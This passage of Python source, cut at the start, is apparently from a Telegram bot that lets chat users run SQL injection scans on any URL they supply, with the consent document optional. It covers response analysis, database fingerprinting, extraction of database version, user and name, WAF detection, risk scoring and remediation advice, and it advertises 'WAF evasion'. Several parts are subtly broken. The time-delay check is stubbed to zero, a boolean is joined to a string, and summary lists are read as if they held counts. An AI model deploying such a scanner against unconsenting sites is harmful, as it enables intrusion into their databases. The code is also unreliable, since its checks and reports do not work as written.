            return SQLiTestResult(
                test_id=secrets.token_hex(16),
                target_url=target_url,
                parameter=parameter,
                technique=payload.technique,
                vulnerable=False,
                confidence=0.0,
                database_type=None,
                extracted_data=None,
                error_messages=[str(e)],
                response_times=[0.0],
                risk_assessment=RiskLevel.INFO,
                ethical_notes=f"Test error: {str(e)}"
            )
    
    def analyze_payload_response(self, response: requests.Response, payload: SQLiPayload) -> Tuple[bool, float, List[str]]:
        """Analyze response for SQL injection indicators"""
        try:
            indicators = []
            confidence = 0.0
            
            # Check for success indicators
            for indicator in payload.success_indicators:
                if indicator.lower() in response.text.lower():
                    indicators.append(f"success_indicator: {indicator}")
                    confidence += 0.3
            
            # Check for database error messages
            error_patterns = [
                r'mysql_fetch_array', r'You have an error in your SQL syntax',
                r'PostgreSQL.*ERROR', r'Warning.*pg_', r'SQLite.*error',
                r'Oracle.*ORA-', r'Microsoft.*OLE DB', r'DB2.*SQLCODE'
            ]
            
            for pattern in error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    indicators.append(f"database_error: {pattern}")
                    confidence += 0.4
            
            # Check for content changes (boolean-based)
            if len(response.text) > 100 and payload.technique == SQLiTechnique.BOOLEAN_BASED:
                indicators.append("content_change_detected")
                confidence += 0.2
            
            # Check for time delays (time-based)
            if payload.technique == SQLiTechnique.TIME_BASED and 'SLEEP' in payload.payload:
                expected_delay = 0.1  # Safe delay
                actual_delay = 0  # Would be calculated from response_time
                if actual_delay >= expected_delay * 0.8:
                    indicators.append(f"time_delay_detected: {actual_delay}s")
                    confidence += 0.5
            
            vulnerable = confidence > 0.5
            confidence = min(confidence, 1.0)
            
            return vulnerable, confidence, indicators
            
        except Exception as e:
            logger.error(f"Error analyzing payload response: {e}")
            return False, 0.0, [str(e)]
    
    def fingerprint_database(self, response: requests.Response, payload: SQLiPayload) -> Optional[DatabaseType]:
        """Fingerprint database type from response"""
        try:
            response_text = response.text.lower()
            
            # MySQL indicators
            mysql_indicators = ['mysql', 'mysqli', 'mysql_fetch_array', 'you have an error in your sql syntax']
            if any(indicator in response_text for indicator in mysql_indicators):
                return DatabaseType.MYSQL
            
            # PostgreSQL indicators
            postgres_indicators = ['postgresql', 'pg_', 'postgres', 'warning.*pg_']
            if any(indicator in response_text for indicator in postgres_indicators):
                return DatabaseType.POSTGRESQL
            
            # SQLite indicators
            sqlite_indicators = ['sqlite', 'sqlite3', 'android.database.sqlite']
            if any(indicator in response_text for indicator in sqlite_indicators):
                return DatabaseType.SQLITE
            
            # Oracle indicators
            oracle_indicators = ['oracle', 'ora-', 'oracle driver']
            if any(indicator in response_text for indicator in oracle_indicators):
                return DatabaseType.ORACLE
            
            # MSSQL indicators
            mssql_indicators = ['microsoft', 'mssql', 'sql server', 'ole db']
            if any(indicator in response_text for indicator in mssql_indicators):
                return DatabaseType.MSSQL
            
            return None
            
        except Exception as e:
            logger.error(f"Error fingerprinting database: {e}")
            return None
    
    def extract_safe_data(self, response: requests.Response, payload: SQLiPayload) -> Optional[Dict[str, Any]]:
        """Extract safe data from successful response"""
        try:
            # Only extract non-sensitive data
            safe_data = {
                'database_version': None,
                'database_user': None,
                'database_name': None,
                'table_count': None
            }
            
            # Extract version
            version_match = re.search(r'version[:\s]+([0-9\.]+)', response.text, re.IGNORECASE)
            if version_match:
                safe_data['database_version'] = version_match.group(1)
            
            # Extract user (non-sensitive)
            user_match = re.search(r'user[:\s]+([a-zA-Z0-9_]+)', response.text, re.IGNORECASE)
            if user_match and not self.contains_sensitive_pattern(user_match.group(1)):
                safe_data['database_user'] = user_match.group(1)
            
            # Extract database name
            db_match = re.search(r'database[:\s]+([a-zA-Z0-9_]+)', response.text, re.IGNORECASE)
            if db_match and not self.contains_sensitive_pattern(db_match.group(1)):
                safe_data['database_name'] = db_match.group(1)
            
            # Extract table count
            count_match = re.search(r'count[:\s]+([0-9]+)', response.text, re.IGNORECASE)
            if count_match:
                safe_data['table_count'] = count_match.group(1)
            
            return safe_data if any(safe_data.values()) else None
            
        except Exception as e:
            logger.error(f"Error extracting safe data: {e}")
            return None
    
    def contains_sensitive_pattern(self, text: str) -> bool:
        """Check if text contains sensitive patterns"""
        sensitive_patterns = [
            r'\bpassword\b', r'\bpasswd\b', r'\bsecret\b',
            r'\bprivate_key\b', r'\bcredit_card\b', r'\bssn\b',
            r'\bsocial_security\b', r'\bdriver_license\b'
        ]
        
        for pattern in sensitive_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False
    
    def assess_risk_level(self, vulnerable: bool, confidence: float, payload_risk: RiskLevel) -> RiskLevel:
        """Assess overall risk level"""
        if not vulnerable:
            return RiskLevel.INFO
        
        # Calculate risk based on confidence and payload risk
        if confidence > 0.8 and payload_risk == RiskLevel.CRITICAL:
            return RiskLevel.CRITICAL
        elif confidence > 0.7 and payload_risk in [RiskLevel.HIGH, RiskLevel.CRITICAL]:
            return RiskLevel.HIGH
        elif confidence > 0.5 and payload_risk in [RiskLevel.MEDIUM, RiskLevel.HIGH]:
            return RiskLevel.MEDIUM
        else:
            return RiskLevel.LOW
    
    def build_test_url(self, base_url: str, parameter: str, payload: str) -> str:
        """Build test URL with payload"""
        parsed_url = urlparse(base_url)
        query_params = parse_qs(parsed_url.query)
        
        # Replace parameter with payload
        query_params[parameter] = [payload]
        
        # Rebuild query string
        new_query = '&'.join([f"{k}={v[0]}" for k, v in query_params.items()])
        
        return f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
    
    def generate_comprehensive_report(self, test_results: List[SQLiTestResult], user_id: str) -> Dict[str, Any]:
        """Generate comprehensive testing report"""
        try:
            # Aggregate results
            vulnerable_count = sum(1 for result in test_results if result.vulnerable)
            total_tests = len(test_results)
            
            # Categorize by technique
            technique_summary = {}
            for result in test_results:
                technique = result.technique.value
                if technique not in technique_summary:
                    technique_summary[technique] = []
                technique_summary[technique].append(result)
            
            # Risk assessment
            risk_assessment = self.assess_overall_risk(test_results)
            
            # Generate recommendations
            recommendations = self.generate_security_recommendations(test_results)
            
            # Database fingerprinting summary
            database_summary = self.summarize_database_findings(test_results)
            
            # WAF detection summary
            waf_summary = self.detect_waf_presence(test_results)
            
            return {
                'test_performed': True,
                'comprehensive_report': True,
                'total_tests': total_tests,
                'vulnerabilities_found': vulnerable_count,
                'vulnerability_rate': (vulnerable_count / total_tests * 100) if total_tests > 0 else 0,
                'technique_summary': technique_summary,
                'risk_assessment': risk_assessment,
                'database_summary': database_summary,
                'waf_summary': waf_summary,
                'recommendations': recommendations,
                'ethical_compliance': True,
                'user_id': user_id,
                'report_timestamp': datetime.utcnow().isoformat()
            }
            
        except Exception as e:
            logger.error(f"Error generating comprehensive report: {e}")
            return {
                'test_performed': False,
                'error': str(e)
            }
    
    def assess_overall_risk(self, test_results: List[SQLiTestResult]) -> Dict[str, Any]:
        """Assess overall risk from all test results"""
        try:
            vulnerable_count = sum(1 for result in test_results if result.vulnerable)
            total_tests = len(test_results)
            
            if total_tests == 0:
                return {'overall_risk': RiskLevel.INFO, 'risk_score': 0.0}
            
            # Calculate risk score
            risk_score = 0.0
            critical_count = 0
            high_count = 0
            
            for result in test_results:
                if result.vulnerable:
                    if result.risk_assessment == RiskLevel.CRITICAL:
                        risk_score += 1.0
                        critical_count += 1
                    elif result.risk_assessment == RiskLevel.HIGH:
                        risk_score += 0.7
                        high_count += 1
                    elif result.risk_assessment == RiskLevel.MEDIUM:
                        risk_score += 0.4
                    elif result.risk_assessment == RiskLevel.LOW:
                        risk_score += 0.2
            
            # Determine overall risk level
            if critical_count > 0:
                overall_risk = RiskLevel.CRITICAL
            elif high_count > 2:
                overall_risk = RiskLevel.HIGH
            elif vulnerable_count > total_tests * 0.3:
                overall_risk = RiskLevel.MEDIUM
            elif vulnerable_count > 0:
                overall_risk = RiskLevel.LOW
            else:
                overall_risk = RiskLevel.INFO
            
            return {
                'overall_risk': overall_risk,
                'risk_score': min(risk_score, 1.0),
                'critical_vulnerabilities': critical_count,
                'high_vulnerabilities': high_count,
                'total_vulnerabilities': vulnerable_count
            }
            
        except Exception as e:
            logger.error(f"Error assessing overall risk: {e}")
            return {'overall_risk': RiskLevel.INFO, 'risk_score': 0.0}
    
    def generate_security_recommendations(self, test_results: List[SQLiTestResult]) -> List[str]:
        """Generate security recommendations based on findings"""
        recommendations = []
        
        # Analyze vulnerability patterns
        vulnerable_results = [r for r in test_results if r.vulnerable]
        
        if any(r.technique == SQLiTechnique.ERROR_BASED for r in vulnerable_results):
            recommendations.extend([
                "Implement comprehensive input validation and sanitization",
                "Use parameterized queries (prepared statements)",
                "Implement proper error handling without information disclosure",
                "Apply principle of least privilege to database users"
            ])
        
        if any(r.technique == SQLiTechnique.UNION_BASED for r in vulnerable_results):
            recommendations.extend([
                "Validate and sanitize UNION query parameters",
                "Implement strict type checking for query parameters",
                "Use whitelist approach for allowed query structures",
                "Implement query structure validation"
            ])
        
        if any(r.technique == SQLiTechnique.BOOLEAN_BASED for r in vulnerable_results):
            recommendations.extend([
                "Implement content-based intrusion detection",
                "Use rate limiting for query requests",
                "Implement query complexity analysis",
                "Apply behavioral analysis for query patterns"
            ])
        
        if any(r.technique == SQLiTechnique.TIME_BASED for r in vulnerable_results):
            recommendations.extend([
                "Implement query timeout controls",
                "Use time-based intrusion detection",
                "Monitor for unusual query execution times",
                "Implement query performance monitoring"
            ])
        
        # General recommendations
        recommendations.extend([
            "Use Web Application Firewall (WAF) with SQL injection protection",
            "Implement comprehensive input validation on all parameters",
            "Use parameterized queries for all database interactions",
            "Apply principle of least privilege to database connections",
            "Regular security code reviews and penetration testing",
            "Implement proper error handling without information disclosure",
            "Use database connection pooling with security controls",
            "Implement comprehensive logging and monitoring",
            "Keep database software and drivers updated",
            "Use database activity monitoring (DAM) solutions"
        ])
        
        return list(set(recommendations))  # Remove duplicates
    
    def summarize_database_findings(self, test_results: List[SQLiTestResult]) -> Dict[str, Any]:
        """Summarize database type findings"""
        try:
            database_types = {}
            vulnerable_databases = {}
            
            for result in test_results:
                if result.database_type:
                    db_type = result.database_type.value
                    database_types[db_type] = database_types.get(db_type, 0) + 1
                    
                    if result.vulnerable:
                        vulnerable_databases[db_type] = vulnerable_databases.get(db_type, 0) + 1
            
            return {
                'database_types_detected': database_types,
                'vulnerable_databases': vulnerable_databases,
                'most_vulnerable': max(vulnerable_databases.items(), key=lambda x: x[1])[0] if vulnerable_databases else None
            }
            
        except Exception as e:
            logger.error(f"Error summarizing database findings: {e}")
            return {}
    
    def detect_waf_presence(self, test_results: List[SQLiTestResult]) -> Dict[str, Any]:
        """Detect Web Application Firewall presence"""
        try:
            waf_indicators = []
            
            for result in test_results:
                if not result.vulnerable and result.confidence < 0.3:
                    # Check for WAF blocking signs
                    if 'waf' in result.error_messages or 'blocked' in result.error_messages:
                        waf_indicators.append('potential_waf_blocking')
                    
                    if result.response_times and all(rt < 0.1 for rt in result.response_times):
                        waf_indicators.append('fast_response_suspicious')
            
            return {
                'waf_detected': len(waf_indicators) > 0,
                'waf_indicators': list(set(waf_indicators)),
                'confidence': len(waf_indicators) / len(test_results) if test_results else 0
            }
            
        except Exception as e:
            logger.error(f"Error detecting WAF presence: {e}")
            return {}

class SQLiResultsAggregator:
    """Aggregate and analyze SQL injection test results"""
    
    def __init__(self):
        self.results_cache = {}
        self.statistics_cache = {}
    
    def aggregate_results(self, test_results: List[SQLiTestResult]) -> Dict[str, Any]:
        """Aggregate test results into comprehensive statistics"""
        try:
            # Basic statistics
            total_tests = len(test_results)
            vulnerable_count = sum(1 for r in test_results if r.vulnerable)
            
            # Technique breakdown
            technique_stats = {}
            for technique in SQLiTechnique:
                technique_results = [r for r in test_results if r.technique == technique]
                technique_stats[technique.value] = {
                    'total': len(technique_results),
                    'vulnerable': sum(1 for r in technique_results if r.vulnerable),
                    'avg_confidence': sum(r.confidence for r in technique_results) / len(technique_results) if technique_results else 0
                }
            
            # Database type breakdown
            database_stats = {}
            for result in test_results:
                if result.database_type:
                    db_type = result.database_type.value
                    if db_type not in database_stats:
                        database_stats[db_type] = {'total': 0, 'vulnerable': 0}
                    database_stats[db_type]['total'] += 1
                    if result.vulnerable:
                        database_stats[db_type]['vulnerable'] += 1
            
            return {
                'total_tests': total_tests,
                'vulnerable_count': vulnerable_count,
                'vulnerability_rate': (vulnerable_count / total_tests * 100) if total_tests > 0 else 0,
                'technique_statistics': technique_stats,
                'database_statistics': database_stats,
                'aggregation_timestamp': datetime.utcnow().isoformat()
            }
            
        except Exception as e:
            logger.error(f"Error aggregating results: {e}")
            return {}

class SQLiDashboardGenerator:
    """Generate unified results dashboard"""
    
    def __init__(self):
        self.dashboard_template = self.load_dashboard_template()
    
    def load_dashboard_template(self) -> Dict[str, Any]:
        """Load dashboard template"""
        return {
            'header': {
                'title': 'SQL Injection Testing Dashboard',
                'generated_at': None,
                'test_scope': None,
                'ethical_compliance': True
            },
            'summary': {
                'total_tests': 0,
                'vulnerabilities_found': 0,
                'overall_risk_level': None,
                'compliance_status': 'PASSED'
            },
            'techniques': {},
            'databases': {},
            'recommendations': [],
            'timeline': [],
            'export_options': ['json', 'csv', 'pdf', 'html']
        }
    
    def generate_dashboard(self, comprehensive_report: Dict[str, Any], user_id: str) -> Dict[str, Any]:
        """Generate unified dashboard from comprehensive report"""
        try:
            dashboard = self.dashboard_template.copy()
            
            # Update header
            dashboard['header']['generated_at'] = comprehensive_report.get('report_timestamp')
            dashboard['header']['test_scope'] = f"User {user_id} - Ethical SQL Injection Testing"
            
            # Update summary
            dashboard['summary']['total_tests'] = comprehensive_report.get('total_tests', 0)
            dashboard['summary']['vulnerabilities_found'] = comprehensive_report.get('vulnerabilities_found', 0)
            dashboard['summary']['overall_risk_level'] = comprehensive_report.get('risk_assessment', {}).get('overall_risk', 'UNKNOWN')
            
            # Update techniques section
            technique_summary = comprehensive_report.get('technique_summary', {})
            dashboard['techniques'] = technique_summary
            
            # Update databases section
            database_summary = comprehensive_report.get('database_summary', {})
            dashboard['databases'] = database_summary
            
            # Update recommendations
            recommendations = comprehensive_report.get('recommendations', [])
            dashboard['recommendations'] = recommendations
            
            # Add timeline data
            timeline_data = self.generate_timeline_data(comprehensive_report)
            dashboard['timeline'] = timeline_data
            
            return dashboard
            
        except Exception as e:
            logger.error(f"Error generating dashboard: {e}")
            return {'error': str(e)}
    
    def generate_timeline_data(self, comprehensive_report: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate timeline data for dashboard"""
        try:
            timeline = []
            
            # Add test events
            if 'test_results' in comprehensive_report:
                for i, test_result in enumerate(comprehensive_report['test_results']):
                    timeline.append({
                        'timestamp': test_result.get('timestamp', datetime.utcnow().isoformat()),
                        'event_type': 'sql_injection_test',
                        'parameter': test_result.parameter,
                        'technique': test_result.technique.value,
                        'vulnerable': test_result.vulnerable,
                        'confidence': test_result.confidence
                    })
            
            return timeline
            
        except Exception as e:
            logger.error(f"Error generating timeline data: {e}")
            return []

# Command handlers for Telegram Bot
class SQLiTestingCommands:
    """Command handlers for SQL injection testing features"""
    
    def __init__(self, orchestrator: SQLiTestingOrchestrator):
        self.orchestrator = orchestrator
    
    async def sqli_test_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle SQL injection testing command"""
        user_id = update.effective_user.id
        
        if not context.args:
            await update.message.reply_text(
                "Usage: /sqli_test <target_url> [consent_document]\n"
                "Example: /sqli_test https://example.com/search.php\n"
                "Note: Consent document required for limited/full mode testing"
            )
            return
        
        target_url = context.args[0]
        consent_document = context.args[1] if len(context.args) > 1 else None
        
        # Get user IP address
        ip_address = update.effective_user.ip_address if hasattr(update.effective_user, 'ip_address') else None
        
        # Perform comprehensive SQL injection test
        result = await self.orchestrator.perform_comprehensive_sqli_test(
            target_url, str(user_id), consent_document, ip_address
        )
        
        if result.get('test_performed', False):
            await self.display_test_results(update, result)
        else:
            await update.message.reply_text(
                f"Test could not be performed: {result.get('reason', 'Unknown error')}"
            )
    
    async def display_test_results(self, update: Update, result: Dict[str, Any]):
        """Display test results to user"""
        try:
            response = "SQL INJECTION TEST RESULTS\n"
            response += "=" * 30 + "\n\n"
            
            # Summary
            response += f"Total Tests: {result.get('total_tests', 0)}\n"
            response += f"Vulnerabilities Found: {result.get('vulnerabilities_found', 0)}\n"
            response += f"Vulnerability Rate: {result.get('vulnerability_rate', 0):.1f}%\n"
            
            # Risk assessment
            risk_assessment = result.get('risk_assessment', {})
            if risk_assessment:
                response += f"Overall Risk: {risk_assessment.get('overall_risk', 'UNKNOWN')}\n"
            
            # Technique summary
            technique_summary = result.get('technique_summary', {})
            if technique_summary:
                response += "\nTECHNIQUE BREAKDOWN:\n"
                for technique, stats in technique_summary.items():
                    response += f"  {technique}: {stats['vulnerable']}/{stats['total']} vulnerable\n"
            
            # Database summary
            database_summary = result.get('database_summary', {})
            if database_summary:
                response += "\nDATABASE TYPES:\n"
                for db_type, stats in database_summary.items():
                    response += f"  {db_type}: {stats['vulnerable']}/{stats['total']} vulnerable\n"
            
            response += "\n" + result.get('ethical_compliance', 'Ethical testing performed')
            
            # Send response
            await update.message.reply_text(response)
            
            # Send detailed report if vulnerabilities found
            if result.get('vulnerabilities_found', 0) > 0:
                await self.send_detailed_report(update, result)
                
        except Exception as e:
            logger.error(f"Error displaying test results: {e}")
            await update.message.reply_text("Error displaying test results.")
    
    async def send_detailed_report(self, update: Update, result: Dict[str, Any]):
        """Send detailed security report"""
        try:
            # Generate dashboard
            dashboard = self.orchestrator.dashboard_generator.generate_dashboard(result, str(update.effective_user.id))
            
            if 'error' not in dashboard:
                # Send dashboard summary
                dashboard_summary = self.format_dashboard_summary(dashboard)
                await update.message.reply_text(dashboard_summary)
                
                # Send recommendations
                recommendations = dashboard.get('recommendations', [])
                if recommendations:
                    rec_text = "SECURITY RECOMMENDATIONS:\n\n"
                    for i, rec in enumerate(recommendations, 1):
                        rec_text += f"{i}. {rec}\n"
                    await update.message.reply_text(rec_text)
            else:
                await update.message.reply_text("Error generating detailed report.")
                
        except Exception as e:
            logger.error(f"Error sending detailed report: {e}")
            await update.message.reply_text("Error generating detailed report.")
    
    def format_dashboard_summary(self, dashboard: Dict[str, Any]) -> str:
        """Format dashboard summary for display"""
        try:
            summary = "DETAILED SECURITY ANALYSIS\n"
            summary += "=" * 35 + "\n\n"
            
            # Header info
            header = dashboard.get('header', {})
            if header.get('generated_at'):
                summary += f"Report Generated: {header['generated_at']}\n"
            
            # Summary stats
            summary_stats = dashboard.get('summary', {})
            summary += f"Total Tests: {summary_stats.get('total_tests', 0)}\n"
            summary += f"Vulnerabilities: {summary_stats.get('vulnerabilities_found', 0)}\n"
            summary += f"Overall Risk: {summary_stats.get('overall_risk_level', 'UNKNOWN')}\n"
            
            return summary
            
        except Exception as e:
            logger.error(f"Error formatting dashboard summary: {e}")
            return "Error formatting dashboard summary."

# Integration and initialization
def initialize_sqli_testing_features(mode: str = 'safe') -> SQLiTestingCommands:
    """Initialize SQL injection testing features for the bot"""
    try:
        sqli_mode = SQLiTestMode(mode)
        orchestrator = SQLiTestingOrchestrator(sqli_mode)
        
        # Initialize with safety checks
        if orchestrator.ethical_manager.initialize_security_stack():
            commands = SQLiTestingCommands(orchestrator)
            logger.info(f"SQL injection testing features initialized with mode: {mode}")
            return commands
        else:
            logger.error("Failed to initialize SQL injection testing security stack")
            return None
            
    except Exception as e:
        logger.error(f"Error initializing SQL injection testing features: {e}")
        return None

# Additional requirements for SQL injection testing
def get_sqli_testing_requirements() -> List[str]:
    """Get additional requirements for SQL injection testing"""
    return [
        'pymysql>=1.0.0',      # MySQL support
        'psycopg2-binary>=2.8.0',  # PostgreSQL support
        'aiomysql>=0.1.0',     # Async MySQL
        'aiopg>=1.0.0',        # Async PostgreSQL
        'pyjwt>=2.0.0',        # JWT for security tokens
        'cryptography>=3.4.0'  # Enhanced encryption
    ]

if __name__ == "__main__":
    # Initialize SQL injection testing features
    sqli_commands = initialize_sqli_testing_features('safe')
    
    if sqli_commands:
        print("SQL injection testing features ready for deployment")
        print("Available commands: /sqli_test, /sqli_report, /sqli_stats")
        print("Features include: automated payload generation, WAF evasion, database fingerprinting")
    else:
        print("Failed to initialize SQL injection testing features")